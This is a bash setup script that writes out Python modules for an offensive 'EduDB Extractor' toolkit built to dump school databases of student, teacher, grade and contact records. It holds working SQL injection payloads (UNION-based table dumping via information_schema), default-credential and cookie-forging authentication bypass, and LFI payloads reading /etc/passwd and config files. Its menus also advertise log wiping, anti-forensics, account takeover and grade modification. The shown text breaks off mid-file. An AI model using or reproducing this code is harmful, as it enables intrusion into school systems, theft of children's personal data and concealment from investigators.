#!/bin/bash
# setup.sh - EduDB Extractor Toolkit Installation Script

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║      EDUDB EXTRACTOR TOOLKIT - INSTALLATION         ║"
echo "║            School Database Dumping System           ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -eq 0 ]; then 
    echo -e "${YELLOW}[!] Warning: Running as root is not recommended${NC}"
    read -p "Continue anyway? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Function to print status
print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Check Python version
print_status "Checking Python version..."
python3 --version > /dev/null 2>&1
if [ $? -ne 0 ]; then
    print_error "Python3 is not installed!"
    print_status "Installing Python3..."
    
    if [ -f /etc/debian_version ]; then
        sudo apt-get update
        sudo apt-get install -y python3 python3-pip python3-venv
    elif [ -f /etc/redhat-release ]; then
        sudo yum install -y python3 python3-pip
    elif [ "$(uname)" == "Darwin" ]; then
        brew install python3
    else
        print_error "Unsupported OS. Please install Python3 manually."
        exit 1
    fi
fi

PYTHON_VERSION=$(python3 --version | cut -d' ' -f2)
print_success "Python $PYTHON_VERSION detected"

# Create directory structure
print_status "Creating directory structure..."

mkdir -p edudb_extractor
cd edudb_extractor

DIRECTORIES=(
    "recon"
    "exploit" 
    "extract"
    "analyze"
    "stealth"
    "targets"
    "logs"
    "outputs"
    "visualizations"
    "reports"
    "database"
    "backups"
)

for dir in "${DIRECTORIES[@]}"; do
    mkdir -p "$dir"
    print_success "Created: $dir/"
done

# Create all Python files with complete code
print_status "Creating Python modules..."

# 1. main.py
cat > main.py << 'EOF'
#!/usr/bin/env python3
# main.py - EduDB Extractor Main Menu
import os
import sys
import time
from recon.school_scanner import SchoolScanner
from exploit.sql_injector import SQLInjector
from exploit.auth_bypass import AuthBypass
from exploit.lfi_scanner import LFIScanner
from extract.db_dumper import DBDumper
from analyze.data_visualizer import DataVisualizer
from stealth.proxy_rotator import ProxyRotator
from stealth.log_cleaner import LogCleaner

class EduDBExtractor:
    def __init__(self):
        self.proxy_rotator = ProxyRotator()
        self.scanner = SchoolScanner(self.proxy_rotator)
        self.injector = SQLInjector(self.proxy_rotator)
        self.auth_bypass = AuthBypass(self.proxy_rotator)
        self.lfi_scanner = LFIScanner(self.proxy_rotator)
        self.dumper = DBDumper(self.proxy_rotator)
        self.visualizer = DataVisualizer()
        self.log_cleaner = LogCleaner()
        self.target_url = ""
        self.session_data = {}
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════════════╗
        ║        EDUDB EXTRACTOR TOOLKIT v2.0          ║
        ║     School Database Dumping System           ║
        ║                                              ║
        ║  [🔥] Target: School Management Systems      ║
        ║  [📊] Data: Students, Teachers, Grades       ║
        ║  [🎯] Method: Multi-Vector Extraction        ║
        ╚══════════════════════════════════════════════════╝
        """
        print(banner)
    
    def main_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            if self.target_url:
                print(f"\n[🎯] Current Target: {self.target_url}")
            
            print("\n" + "="*50)
            print("MAIN MENU")
            print("="*50)
            print("1. 🎯 Set Target Website")
            print("2. 🔍 Reconnaissance & Scanning")
            print("3. 🗡️ Exploit & Vulnerability Testing")
            print("4. 🗄️ Database Extraction")
            print("5. 📊 Data Analysis & Visualization")
            print("6. 🛡️ Stealth & Anti-Forensics")
            print("7. 📁 View Extracted Data")
            print("8. 🚪 Exit")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.set_target()
            elif choice == '2':
                self.recon_menu()
            elif choice == '3':
                self.exploit_menu()
            elif choice == '4':
                self.extract_menu()
            elif choice == '5':
                self.analyze_menu()
            elif choice == '6':
                self.stealth_menu()
            elif choice == '7':
                self.view_data()
            elif choice == '8':
                print("\n[!] Cleaning up...")
                self.log_cleaner.clean_temporary_files()
                time.sleep(1)
                sys.exit(0)
            else:
                print("\n[!] Invalid option!")
                time.sleep(1)
    
    def set_target(self):
        print("\n" + "="*50)
        print("TARGET CONFIGURATION")
        print("="*50)
        
        url = input("Enter target school website URL (e.g., http://school.edu): ").strip()
        if not url.startswith('http'):
            url = 'http://' + url
        
        self.target_url = url
        self.session_data['target_url'] = url
        
        print(f"\n[+] Testing connection to {url}...")
        if self.scanner.test_connection(url):
            print("[✓] Connection successful")
            
            cms = self.scanner.detect_cms(url)
            if cms:
                print(f"[✓] Detected CMS: {cms}")
                self.session_data['cms'] = cms
            
            info = self.scanner.get_school_info(url)
            if info:
                print(f"[✓] School identified: {info.get('name', 'Unknown')}")
                self.session_data.update(info)
        else:
            print("[!] Connection failed")
        
        input("\nPress Enter to continue...")
    
    def recon_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("RECONNAISSANCE MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🔍 Full School System Scan")
            print("2. 📋 Enumerate School Pages")
            print("3. 🏫 Identify Student Portal")
            print("4. 👨‍🏫 Find Teacher/Admin Areas")
            print("5. 💾 Check Database Exposure")
            print("6. 🔐 Test Default Credentials")
            print("7. 📊 Generate Recon Report")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.full_scan()
            elif choice == '2':
                self.enumerate_pages()
            elif choice == '3':
                self.find_student_portal()
            elif choice == '4':
                self.find_admin_areas()
            elif choice == '5':
                self.check_db_exposure()
            elif choice == '6':
                self.test_default_creds()
            elif choice == '7':
                self.generate_recon_report()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def exploit_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("EXPLOIT MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 💉 SQL Injection Testing")
            print("2. 🚪 Authentication Bypass")
            print("3. 📁 Local File Inclusion (LFI)")
            print("4. 🔓 Session Hijacking")
            print("5. 🎯 Targeted Student Data Access")
            print("6. 👨‍💼 Teacher/Admin Account Takeover")
            print("7. 📝 Grade Modification Testing")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.sql_injection_test()
            elif choice == '2':
                self.auth_bypass_test()
            elif choice == '3':
                self.lfi_test()
            elif choice == '4':
                self.session_hijack_test()
            elif choice == '5':
                self.target_student_data()
            elif choice == '6':
                self.admin_takeover_test()
            elif choice == '7':
                self.grade_mod_test()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def extract_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("DATABASE EXTRACTION MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🗄️ Dump Complete Database")
            print("2. 👨‍🎓 Extract Student Records")
            print("3. 👨‍🏫 Extract Teacher Records")
            print("4. 📊 Extract Grade Data")
            print("5. 🏠 Extract Address & Contact Info")
            print("6. 📅 Extract Attendance Records")
            print("7. 💰 Extract Financial Data (if any)")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.dump_complete_db()
            elif choice == '2':
                self.extract_student_data()
            elif choice == '3':
                self.extract_teacher_data()
            elif choice == '4':
                self.extract_grade_data()
            elif choice == '5':
                self.extract_contact_data()
            elif choice == '6':
                self.extract_attendance_data()
            elif choice == '7':
                self.extract_financial_data()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def analyze_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("DATA ANALYSIS & VISUALIZATION")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 📈 Student Distribution Chart")
            print("2. 🎯 Grade Analysis Visualization")
            print("3. 🕸️ Relationship Network Graph")
            print("4. 📅 Event Timeline Chart")
            print("5. 📊 Generate Comprehensive Dashboard")
            print("6. 📋 Data Statistics Summary")
            print("7. 🎨 Custom Visualization")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.student_distribution_chart()
            elif choice == '2':
                self.grade_analysis_visualization()
            elif choice == '3':
                self.relationship_network_graph()
            elif choice == '4':
                self.event_timeline_chart()
            elif choice == '5':
                self.generate_comprehensive_dashboard()
            elif choice == '6':
                self.data_statistics_summary()
            elif choice == '7':
                self.custom_visualization()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def stealth_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("STEALTH & ANTI-FORENSICS")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🛡️ Enable Proxy Rotation")
            print("2. 🗑️ Clear System Logs")
            print("3. 🔒 Encrypt Sensitive Files")
            print("4. 🕵️‍♂️ Anti-Forensics Measures")
            print("5. 🌐 Spoof Requests")
            print("6. 📝 Clean Temporary Files")
            print("7. 🚫 Disable Logging Temporarily")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.enable_proxy_rotation()
            elif choice == '2':
                self.clear_system_logs()
            elif choice == '3':
                self.encrypt_sensitive_files()
            elif choice == '4':
                self.anti_forensics_measures()
            elif choice == '5':
                self.spoof_requests()
            elif choice == '6':
                self.clean_temporary_files()
            elif choice == '7':
                self.disable_logging_temporarily()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def full_scan(self):
        print("\n[+] Starting full reconnaissance scan...")
        results = self.scanner.comprehensive_scan(self.target_url)
        self.session_data['scan_results'] = results
        print(f"[✓] Scan completed. Found {len(results.get('pages', []))} pages")
        input("\nPress Enter to continue...")
    
    def sql_injection_test(self):
        print("\n[+] Testing for SQL Injection vulnerabilities...")
        test_params = ['student_id', 'nis', 'nisn', 'id_siswa']
        vulnerable = []
        for param in test_params:
            is_vuln = self.injector.test_parameter(self.target_url, param)
            if is_vuln:
                vulnerable.append(param)
                print(f"  [✓] VULNERABLE: {param}")
        
        if vulnerable:
            print(f"\n[!] Found {len(vulnerable)} vulnerable parameters!")
            self.session_data['sql_injection'] = vulnerable
            exploit = input("\nExploit vulnerable parameters? (y/n): ").lower()
            if exploit == 'y':
                self.exploit_sql_injection(vulnerable)
        else:
            print("\n[✓] No SQL injection vulnerabilities found")
        
        input("\nPress Enter to continue...")
    
    def exploit_sql_injection(self, vulnerable_params):
        print("\n[+] Starting SQL injection exploitation...")
        
        for param in vulnerable_params[:3]:
            print(f"\n  Exploiting: {param}")
            
            db_info = self.injector.get_database_info(self.target_url, param)
            if db_info:
                print(f"    Database: {db_info.get('database')}")
                print(f"    Version: {db_info.get('version')}")
                self.session_data['db_info'] = db_info
            
            tables = self.injector.get_tables(self.target_url, param)
            if tables:
                print(f"    Tables found: {len(tables)}")
                
                school_tables = []
                for table in tables:
                    if any(keyword in table.lower() for keyword in ['siswa', 'student', 'guru', 'teacher', 'nilai', 'grade']):
                        school_tables.append(table)
                        print(f"      [🎯] {table}")
                
                if school_tables:
                    for table in school_tables[:2]:
                        print(f"\n    Extracting from: {table}")
                        data = self.injector.dump_table(self.target_url, param, table, limit=10)
                        if data:
                            print(f"      Rows extracted: {len(data)}")
                            if 'extracted_data' not in self.session_data:
                                self.session_data['extracted_data'] = {}
                            self.session_data['extracted_data'][table] = data
        
        input("\nPress Enter to continue...")
    
    def dump_complete_db(self):
        print("\n[⚠️] WARNING: This will extract ALL database data")
        confirm = input("Are you sure? This may take a long time (y/n): ").lower()
        
        if confirm != 'y':
            return
        
        print("\n[+] Starting complete database dump...")
        
        if 'sql_injection' not in self.session_data:
            print("[!] No SQL injection points found. Run exploitation first.")
            input("\nPress Enter to continue...")
            return
        
        vuln_param = self.session_data['sql_injection'][0]
        
        print("[+] Enumerating all tables...")
        tables = self.injector.get_tables(self.target_url, vuln_param)
        
        if not tables:
            print("[!] Could not enumerate tables")
            return
        
        print(f"[+] Found {len(tables)} tables")
        
        school_tables = []
        for table in tables:
            table_lower = table.lower()
            if any(keyword in table_lower for keyword in ['siswa', 'student', 'guru', 'teacher', 'nilai', 'grade']):
                school_tables.append(table)
        
        print(f"[🎯] Identified {len(school_tables)} school-related tables")
        
        all_data = {}
        for i, table in enumerate(school_tables, 1):
            print(f"\n[{i}/{len(school_tables)}] Dumping: {table}")
            
            try:
                data = self.injector.dump_table(self.target_url, vuln_param, table)
                if data:
                    all_data[table] = data
                    print(f"    Extracted {len(data)} rows")
                    
                    import json
                    filename = f"dump_{table}.json"
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                    print(f"    Saved to: {filename}")
                    
                    time.sleep(0.5)
            except Exception as e:
                print(f"    Error: {e}")
        
        self.session_data['complete_dump'] = all_data
        print(f"\n[✓] Complete dump finished. Extracted {len(all_data)} tables.")
        
        self.generate_data_report(all_data)
        
        input("\nPress Enter to continue...")
    
    def generate_data_report(self, data):
        print("\n[+] Generating data analysis report...")
        
        total_records = sum(len(table_data) for table_data in data.values())
        
        print(f"\n📊 DATA ANALYSIS REPORT")
        print("="*40)
        print(f"Total tables extracted: {len(data)}")
        print(f"Total records: {total_records}")
        print("="*40)
        
        report = {
            'extraction_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'target_url': self.target_url,
            'tables_extracted': len(data),
            'total_records': total_records,
            'table_summary': {name: len(records) for name, records in data.items()}
        }
        
        import json
        with open('extraction_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[✓] Report saved to: extraction_report.json")
    
    def student_distribution_chart(self):
        if 'complete_dump' not in self.session_data:
            print("[!] No data extracted yet. Run database extraction first.")
            input("\nPress Enter to continue...")
            return
        
        print("\n[+] Generating student distribution chart...")
        student_data = self.dumper.organize_student_data(self.session_data['complete_dump'])
        
        if student_data:
            chart_file = self.visualizer.plot_student_distribution(student_data)
            if chart_file:
                print(f"[✓] Chart saved: {chart_file}")
        else:
            print("[!] No student data found")
        
        input("\nPress Enter to continue...")
    
    def enable_proxy_rotation(self):
        print("\n[+] Enabling proxy rotation...")
        self.proxy_rotator.validate_proxies()
        stats = self.proxy_rotator.get_stats()
        print(f"[✓] Proxy rotation enabled. Working proxies: {stats['working']}/{stats['total']}")
        input("\nPress Enter to continue...")
    
    def clear_system_logs(self):
        print("\n[⚠️] WARNING: This will clear system logs")
        confirm = input("Are you sure? (y/n): ").lower()
        
        if confirm == 'y':
            print("\n[+] Clearing system logs...")
            results = self.log_cleaner.clean_system_logs()
            cleared_count = sum(len(r.get('files_cleared', [])) for r in results)
            print(f"[✓] Cleared {cleared_count} log files")
        else:
            print("[!] Operation cancelled")
        
        input("\nPress Enter to continue...")
    
    def view_data(self):
        if 'complete_dump' not in self.session_data:
            print("[!] No data extracted yet")
            input("\nPress Enter to continue...")
            return
        
        print("\n" + "="*50)
        print("EXTRACTED DATA VIEWER")
        print("="*50)
        
        data = self.session_data['complete_dump']
        print(f"Total tables: {len(data)}")
        
        for table_name, table_data in data.items():
            print(f"\n📁 {table_name} ({len(table_data)} records):")
            if table_data:
                for i, row in enumerate(table_data[:3]):
                    print(f"  Row {i+1}: {str(row)[:100]}...")
                if len(table_data) > 3:
                    print(f"  ... and {len(table_data) - 3} more rows")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        tool = EduDBExtractor()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
EOF
print_success "Created: main.py"

# 2. recon/school_scanner.py
cat > recon/school_scanner.py << 'EOF'
#!/usr/bin/env python3
# recon/school_scanner.py - School Website Scanner
import requests
import re
import time
import random
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class SchoolScanner:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
    def random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def test_connection(self, url):
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def detect_cms(self, url):
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=10)
            html = response.text.lower()
            
            cms_patterns = {
                'SIMPEG': ['simpeg', 'sistem informasi pegawai'],
                'SIAKAD': ['siakad', 'sistem informasi akademik'],
                'DAPODIK': ['dapodik', 'data pokok pendidikan'],
                'WordPress': ['wp-content', 'wordpress'],
                'Joomla': ['joomla', '/media/jui/']
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern in html:
                        return cms
            
            return 'Unknown'
        except:
            return 'Unknown'
    
    def get_school_info(self, url):
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            info = {}
            
            if soup.title:
                info['title'] = soup.title.string
            
            for h1 in soup.find_all(['h1', 'h2']):
                text = h1.get_text().lower()
                if any(word in text for word in ['sma', 'smp', 'sd', 'sekolah', 'school']):
                    info['name'] = h1.get_text().strip()
                    break
            
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, response.text)
            if emails:
                info['emails'] = list(set(emails))[:3]
            
            phone_patterns = [
                r'\+\d{2}\s?\d{3,4}\s?\d{3,4}\s?\d{3,4}',
                r'\d{3,4}[-.\s]?\d{3,4}[-.\s]?\d{3,4}'
            ]
            
            phones = []
            for pattern in phone_patterns:
                phones.extend(re.findall(pattern, response.text))
            
            if phones:
                info['phones'] = list(set(phones))[:3]
            
            return info
        except:
            return {}
    
    def comprehensive_scan(self, url):
        results = {
            'pages': [],
            'forms': [],
            'db_endpoints': [],
            'vulnerabilities': []
        }
        
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                
                if self.is_school_related(href):
                    results['pages'].append(full_url)
            
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                if form_action:
                    full_action = urljoin(url, form_action)
                    form_data = {
                        'action': full_action,
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all(['input', 'select', 'textarea']):
                        input_data = {
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'id': input_tag.get('id', '')
                        }
                        form_data['inputs'].append(input_data)
                    
                    results['forms'].append(form_data)
            
            db_patterns = ['admin', 'login', 'siswa', 'guru', 'nilai', 'akademik', 'data']
            
            for page in results['pages'][:50]:
                page_lower = page.lower()
                if any(pattern in page_lower for pattern in db_patterns):
                    results['db_endpoints'].append(page)
            
            results['pages'] = list(set(results['pages']))
            results['db_endpoints'] = list(set(results['db_endpoints']))
            
        except Exception as e:
            print(f"Scan error: {e}")
        
        return results
    
    def is_school_related(self, url_path):
        school_keywords = [
            'siswa', 'student', 'guru', 'teacher',
            'kelas', 'class', 'nilai', 'grade',
            'admin', 'login', 'data', 'export'
        ]
        
        url_lower = url_path.lower()
        return any(keyword in url_lower for keyword in school_keywords)
    
    def enumerate_pages(self, url):
        pages = []
        visited = set()
        
        def crawl(current_url, depth=0, max_depth=2):
            if depth > max_depth or current_url in visited:
                return
            
            visited.add(current_url)
            
            try:
                response = self.session.get(current_url, headers=self.random_headers(), timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                if self.is_school_related(current_url):
                    pages.append(current_url)
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    if urlparse(full_url).netloc == urlparse(url).netloc:
                        crawl(full_url, depth + 1, max_depth)
                
                time.sleep(0.1)
                
            except:
                pass
        
        crawl(url)
        return pages
EOF
print_success "Created: recon/school_scanner.py"

# 3. recon/cms_detector.py (placeholder)
cat > recon/cms_detector.py << 'EOF'
#!/usr/bin/env python3
# recon/cms_detector.py - CMS Detection Module
# Integrated in school_scanner.py

def detect_school_cms(html_content):
    """
    Deteksi CMS sistem sekolah
    Fungsi ini sudah diintegrasikan dalam school_scanner.py
    """
    return "CMS detection integrated in school_scanner.py"
EOF
print_success "Created: recon/cms_detector.py"

# 4. recon/vuln_scanner.py (placeholder)
cat > recon/vuln_scanner.py << 'EOF'
#!/usr/bin/env python3
# recon/vuln_scanner.py - Vulnerability Scanner
# Implemented in exploit modules

def scan_vulnerabilities(url):
    """
    Scan vulnerabilitas website sekolah
    Fungsi diimplementasi dalam modul exploit
    """
    return "Vulnerability scanning implemented in exploit modules"
EOF
print_success "Created: recon/vuln_scanner.py"

# 5. exploit/sql_injector.py
cat > exploit/sql_injector.py << 'EOF'
#!/usr/bin/env python3
# exploit/sql_injector.py - SQL Injection Module
import requests
import time
import re
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse

class SQLInjector:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        
        self.error_based_payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "\" OR \"1\"=\"1"
        ]
        
        self.time_based_payloads = [
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1"
        ]
    
    def test_parameter(self, url, parameter):
        for payload in self.error_based_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                error_indicators = [
                    'sql', 'mysql', 'database', 'syntax',
                    'error', 'warning', 'exception'
                ]
                
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in error_indicators):
                    return True
                    
            except:
                pass
        
        for payload in self.time_based_payloads[:1]:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                elapsed = time.time() - start_time
                
                if elapsed > 4:
                    return True
                    
            except:
                pass
        
        return False
    
    def inject_payload(self, url, parameter, payload):
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        query_dict[parameter] = payload
        
        new_query = urlencode(query_dict, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def get_database_info(self, url, parameter):
        info = {}
        
        version_payloads = [
            f"' UNION SELECT @@version,null--",
            f"' UNION SELECT version(),null--"
        ]
        
        for payload in version_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                version_patterns = [
                    r'(\d+\.\d+\.\d+[^\s<>&"]*)',
                    r'(\d+\.\d+[^\s<>&"]*)'
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        info['version'] = match.group(1)
                        break
                
                if 'version' in info:
                    break
                    
            except:
                pass
        
        return info
    
    def get_tables(self, url, parameter):
        tables = []
        
        table_payloads = [
            f"' UNION SELECT table_name,null FROM information_schema.tables--",
            f"' UNION SELECT null,table_name FROM information_schema.tables--"
        ]
        
        for payload in table_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                potential_tables = re.findall(r'\b\w+\b', response.text)
                
                for table in potential_tables:
                    table_lower = table.lower()
                    if (len(table) > 3 and 
                        table.isalnum() and 
                        not table.isdigit() and
                        not table_lower.startswith('http')):
                        
                        if any(pattern in table_lower for pattern in [
                            'tbl', 'table', 'siswa', 'student',
                            'guru', 'teacher', 'user', 'admin'
                        ]):
                            tables.append(table)
                
                if tables:
                    break
                    
            except:
                pass
        
        tables = list(set(tables))[:50]
        return tables
    
    def dump_table(self, url, parameter, table_name, limit=100):
        data = []
        
        columns = ['col1', 'col2', 'col3']
        columns_str = ','.join(columns)
        
        for i in range(0, limit, 10):
            data_payload = f"' UNION SELECT {columns_str} FROM {table_name} LIMIT {i},10--"
            test_url = self.inject_payload(url, parameter, data_payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                lines = response.text.split('\n')
                for line in lines:
                    if any(indicator in line.lower() for indicator in [
                        '@', '.com', '.id', '08', '+62', 'jl.'
                    ]):
                        cells = re.findall(r'>([^<]+)<', line)
                        row = {}
                        for j, col in enumerate(columns[:len(cells)]):
                            if j < len(cells):
                                row[col] = cells[j]
                        if row:
                            data.append(row)
                
                time.sleep(0.3)
                
            except:
                break
        
        return data[:limit]
EOF
print_success "Created: exploit/sql_injector.py"

# 6. exploit/auth_bypass.py
cat > exploit/auth_bypass.py << 'EOF'
#!/usr/bin/env python3
# exploit/auth_bypass.py - Authentication Bypass Module
import requests
import re
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class AuthBypass:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
    
    def find_login_pages(self, url):
        login_pages = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                has_password = False
                for input_tag in form.find_all('input'):
                    if input_tag.get('type', '').lower() == 'password':
                        has_password = True
                        break
                
                if has_password:
                    action = form.get('action', '')
                    if action:
                        login_url = urljoin(url, action)
                        login_pages.append({
                            'url': login_url,
                            'method': form.get('method', 'GET').upper()
                        })
            
            return login_pages
            
        except Exception as e:
            print(f"Error finding login pages: {e}")
            return []
    
    def test_default_credentials(self, url, credentials_file=None):
        results = []
        credentials = [('admin', 'admin'), ('admin', 'password'), ('guru', 'guru')]
        
        login_pages = self.find_login_pages(url)
        
        if not login_pages:
            return results
        
        for login_page in login_pages:
            for username, password in credentials:
                success = self.test_credential(login_page, username, password)
                
                if success:
                    results.append({
                        'login_page': login_page['url'],
                        'username': username,
                        'password': password,
                        'status': 'SUCCESS'
                    })
                    print(f"  [✓] {username}:{password} - SUCCESS")
                    break
        
        return results
    
    def test_credential(self, login_page, username, password):
        try:
            if login_page['method'] == 'POST':
                data = {'username': username, 'password': password}
                response = self.session.post(
                    login_page['url'],
                    data=data,
                    timeout=10,
                    allow_redirects=True
                )
            else:
                params = {'username': username, 'password': password}
                response = self.session.get(
                    login_page['url'],
                    params=params,
                    timeout=10,
                    allow_redirects=True
                )
            
            if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                return True
            
            return False
            
        except:
            return False
    
    def cookie_manipulation(self, url):
        manipulations = [
            {'name': 'user', 'value': 'admin'},
            {'name': 'role', 'value': 'admin'},
            {'name': 'is_admin', 'value': 'true'}
        ]
        
        results = []
        
        try:
            response = self.session.get(url, timeout=5)
            original_cookies = dict(self.session.cookies)
            
            for manipulation in manipulations:
                self.session.cookies.clear()
                for name, value in original_cookies.items():
                    self.session.cookies.set(name, value)
                self.session.cookies.set(manipulation['name'], manipulation['value'])
                
                test_response = self.session.get(url, timeout=5)
                
                result = {
                    'cookie_name': manipulation['name'],
                    'cookie_value': manipulation['value'],
                    'success': False
                }
                
                if test_response.status_code == 200:
                    if 'admin' in test_response.text.lower():
                        result['success'] = True
                
                results.append(result)
            
        except Exception as e:
            print(f"Cookie manipulation error: {e}")
        
        return results
EOF
print_success "Created: exploit/auth_bypass.py"

# 7. exploit/lfi_scanner.py
cat > exploit/lfi_scanner.py << 'EOF'
#!/usr/bin/env python3
# exploit/lfi_scanner.py - LFI Scanner Module
import requests
import re
from urllib.parse import urljoin, urlparse, quote

class LFIScanner:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        
        self.lfi_payloads = [
            "../../../../../../../../../../etc/passwd",
            "../../../config/database.php",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
    
    def test_lfi(self, url, parameter=None):
        results = []
        
        if not parameter:
            params = self.find_lfi_parameters(url)
            if not params:
                return results
            
            for param_info in params:
                param_results = self.test_parameter_lfi(param_info['url'], param_info['parameter'])
                results.extend(param_results)
        else:
            results = self.test_parameter_lfi(url, parameter)
        
        return results
    
    def find_lfi_parameters(self, url):
        vulnerable_params = []
        
        try:
            response = self.session.get(url, timeout=10)
            
            lfi_param_patterns = ['file', 'page', 'load', 'include', 'path']
            
            urls = re.findall(r'["\'](/[^"\']*\?[^"\']*)["\']', response.text)
            
            for found_url in urls[:10]:
                full_url = urljoin(url, found_url)
                parsed = urlparse(full_url)
                query = parsed.query
                
                if query:
                    params = re.findall(r'([^=&]+)=', query)
                    for param in params:
                        if any(pattern in param.lower() for pattern in lfi_param_patterns):
                            vulnerable_params.append({
                                'url': full_url,
                                'parameter': param
                            })
            
        except Exception as e:
            print(f"Error finding LFI parameters: {e}")
        
        return vulnerable_params
    
